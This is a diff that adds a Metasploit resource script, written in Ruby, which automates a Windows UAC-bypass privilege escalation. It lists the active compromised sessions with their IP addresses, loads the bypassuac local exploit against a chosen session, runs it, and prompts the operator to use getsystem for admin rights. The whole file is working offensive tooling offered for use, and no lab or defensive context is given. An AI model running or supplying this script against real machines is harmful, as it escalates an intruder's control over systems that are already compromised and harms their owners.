@@ -1,0 +1,64 @@
+#bypass_UAC_script.rc
+#author: sushiwushi
+
+<ruby>
+begin
+#Introduction
+puts ("\n==================================================")
+print_good ("This script automates bypass UAC exploit")
+print ("\n")
+
+#Checking for running sessions
+print_status("Checking available sessions...")
+availableSessions = framework.sessions.length
+#exit if no sessions found
+exit if availableSessions==0
+print_good("There are currently #{availableSessions} session(s) running")
+print ("\n")
+#loops for session informaton
+framework.sessions.keys.each do |sessionNum|
+print_status ("Session #{sessionNum}")
+print_good ("IP Address: " + framework.sessions[sessionNum].session_host)
+print_good ("Info: " + framework.sessions[sessionNum].info)
+print ("\n")
+end
+
+#Using bypass UAC exploit
+run_single("use exploit/windows/local/bypassuac")
+#Automatically select first session
+firstSession = framework.sessions.keys[0]
+print_status ("Script will continue with session #{firstSession}")
+print_good ("ENTER to accept, otherwise specify session number")
+print("ENTER for yes: ")
+input = gets.chomp
+if input.empty?
+  input = firstSession
+  print_good ("Selected: session #{input}")
+  run_single ("set session #{input}")
+else
+  print_good ("Selected: session #{input}")
+  run_single ("set session #{input}")
+end
+
+print("\n")
+print_status ("Do you want to EXPLOIT now?")
+print("ENTER for yes: ")
+prompt = gets.chomp
+if prompt.empty?
+  print_good ("Exploiting now...")
+  print_good ("Run getsystem to get admin privileges")
+  run_single("exploit")
+else
+  print ("\n")
+  print_good ("Showing options")
+  run_single ("options")
+  print_good ("All done.")
+  print ("\n")
+end
+#Print error message if no sessions found
+rescue SystemExit
+  print_error ("No sessions found!")
+  print_error ("Quitting!")
+  print ("\n")
+end
+</ruby>
